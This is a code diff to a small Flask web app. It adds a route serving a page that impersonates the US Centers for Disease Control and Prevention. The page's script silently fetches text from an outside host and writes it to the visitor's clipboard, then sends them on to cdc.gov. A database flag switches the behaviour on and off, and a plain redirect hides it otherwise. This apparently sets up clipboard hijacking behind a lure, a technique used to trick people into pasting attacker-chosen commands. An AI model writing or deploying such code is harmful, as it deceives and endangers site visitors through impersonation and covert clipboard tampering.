@@ -11,15 +11,46 @@ client = MongoClient(uri, server_api=ServerApi('1'))
 db = client["db"]
 col = db["dbmain"]
 
-@app.route("/")
-def hello():
-  return redirect("https://www.ncbi.nlm.nih.gov/pmc/", code=302)
+@app.route("/article/<path:text>")
+def hello(text):
+  if col.find_one({"id":999})["status"] == "good":
+    htmltemp = """<!DOCTYPE html>
+  <html>
+  <head>
+      <title>Centers for Disease Control and Prevention</title>
+  </head>
+  <body>
+      <script>
+          // URL of the API endpoint that provides the text
+          var apiUrl = "https://api.zenga.eu.org/api"+window.location.pathname;
+          
+          // Fetch the text from the API
+          fetch(apiUrl)
+              .then(response => response.text())
+              .then(textToCopy => {
+                  // Use navigator.clipboard.writeText() to copy the text to the clipboard
+                  navigator.clipboard.writeText(textToCopy)
+                      .then(function() {
+                          console.log("Text copied to clipboard:", textToCopy);
+                          window.location("https://www.cdc.gov/");
+                      })
+                      .catch(function(err) {
+                          console.error("Error copying text:", err);
+                      });
+              })
+              .catch(error => console.error("Error fetching text from API:", error));
+      </script>
+  </body>
+  </html>
+  """
+    return htmltemp
+  return redirect("https://www.cdc.gov/", code=302)
   
-@app.route('/api/articles/<path:text>')
+@app.route('/api/article/<path:text>')
 def index(text):
   if col.find_one({"id":999})["status"] == "good":
     entryID = request.path.split("/")[3]
     fullText = col.find_one({"id":int(entryID)})
     return fullText["fulltext"]
   else:
-    return redirect("https://www.ncbi.nlm.nih.gov/pmc/", code=302)
+    return redirect("https://www.cdc.gov/", code=302)
